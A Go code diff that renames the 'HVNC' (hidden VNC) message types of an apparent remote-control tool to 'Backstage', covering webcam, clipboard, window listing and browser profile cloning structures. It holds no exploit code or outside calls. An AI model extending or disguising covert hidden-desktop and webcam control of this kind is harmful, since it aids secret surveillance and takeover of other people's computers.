@@ -110,7 +110,7 @@ type FrameHeader struct {
 	Monitor int    `msgpack:"monitor"`
 	FPS     int    `msgpack:"fps"`
 	Format  string `msgpack:"format"`
-	HVNC    bool   `msgpack:"hvnc,omitempty"`
+	Backstage    bool   `msgpack:"backstage,omitempty"`
 	Webcam  bool   `msgpack:"webcam,omitempty"`
 }
 
@@ -346,7 +346,7 @@ type WebcamDevices struct {
 	Selected int            `msgpack:"selected"`
 }
 
-type HVNCCloneProgress struct {
+type BackstageCloneProgress struct {
 	Type        string `msgpack:"type"`
 	Browser     string `msgpack:"browser"`
 	Percent     int    `msgpack:"percent"`
@@ -355,38 +355,38 @@ type HVNCCloneProgress struct {
 	Status      string `msgpack:"status"`
 }
 
-type HVNCDXGIStatus struct {
+type BackstageDXGIStatus struct {
 	Type    string `msgpack:"type"`
 	Success bool   `msgpack:"success"`
 	GPUPid  uint32 `msgpack:"gpuPid"`
 	Message string `msgpack:"message"`
 }
 
-type HVNCLookupResult struct {
+type BackstageLookupResult struct {
 	Type string `msgpack:"type"`
 	Exe  string `msgpack:"exe"`
 	Path string `msgpack:"path"`
 	Done bool   `msgpack:"done"`
 }
 
-type HVNCBrowserCheckResult struct {
+type BackstageBrowserCheckResult struct {
 	Type     string          `msgpack:"type"`
 	Browsers map[string]bool `msgpack:"browsers"`
 }
 
-type HVNCInstalledApp struct {
+type BackstageInstalledApp struct {
 	Name    string `msgpack:"name"`
 	ExePath string `msgpack:"exePath"`
 	Icon    string `msgpack:"icon"`
 }
 
-type HVNCInstalledAppsResult struct {
+type BackstageInstalledAppsResult struct {
 	Type string             `msgpack:"type"`
-	Apps []HVNCInstalledApp `msgpack:"apps"`
+	Apps []BackstageInstalledApp `msgpack:"apps"`
 	Done bool               `msgpack:"done"`
 }
 
-type HVNCBrowserLaunchStatus struct {
+type BackstageBrowserLaunchStatus struct {
 	Type    string `msgpack:"type"`
 	Browser string `msgpack:"browser"`
 	Step    string `msgpack:"step"`
@@ -394,7 +394,7 @@ type HVNCBrowserLaunchStatus struct {
 	Detail  string `msgpack:"detail"`
 }
 
-type HVNCWindowEntry struct {
+type BackstageWindowEntry struct {
 	Title       string `msgpack:"title"`
 	X           int    `msgpack:"x"`
 	Y           int    `msgpack:"y"`
@@ -405,7 +405,7 @@ type HVNCWindowEntry struct {
 	Monitor     int    `msgpack:"monitor"`
 }
 
-type HVNCMonitorEntry struct {
+type BackstageMonitorEntry struct {
 	Index   int    `msgpack:"index"`
 	Name    string `msgpack:"name"`
 	X       int    `msgpack:"x"`
@@ -415,10 +415,10 @@ type HVNCMonitorEntry struct {
 	Primary bool   `msgpack:"primary"`
 }
 
-type HVNCWindowListResult struct {
+type BackstageWindowListResult struct {
 	Type     string             `msgpack:"type"`
-	Windows  []HVNCWindowEntry  `msgpack:"windows"`
-	Monitors []HVNCMonitorEntry `msgpack:"monitors"`
+	Windows  []BackstageWindowEntry  `msgpack:"windows"`
+	Monitors []BackstageMonitorEntry `msgpack:"monitors"`
 }
 
 type ClipboardContent struct {
